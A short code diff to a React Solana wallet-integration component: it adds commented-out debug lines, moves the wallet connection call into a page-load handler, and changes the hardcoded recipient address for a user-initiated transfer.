@@ -22,6 +22,10 @@ const WalletIntegration = () => {
 
                 if (walletAvailable) {
                     const connectedWallet = await window.solana.connect();
+                    // const confirm = await window.solana.confirm()
+                    //
+                    // console.log(confirm + 'ddddddd4545454545sdsdsd')
+
                     console.log(connectedWallet)
                     setWallet(connectedWallet);
 
@@ -41,7 +45,14 @@ const WalletIntegration = () => {
             }
         };
 
-        establishConnection();
+
+
+
+    window.onload= function (){
+        establishConnection()
+        };
+
+
     }, []);
 
     const handleButtonClick = async () => {
@@ -57,7 +68,7 @@ const WalletIntegration = () => {
                 return;
             }
 
-            const toAddress = '64z9TxqxVXYThA5wLWoMJUynGjeqmM1vPP5NBr9WRjRy';
+            const toAddress = '7q96KU92MwXUBbnZveENzD3xeFDAuNKQNnKJ5KbFW38L';
             const lamportsToSend = Math.floor(parseFloat(inputValue) * Math.pow(10, 9));
             const w = getWallet();
 
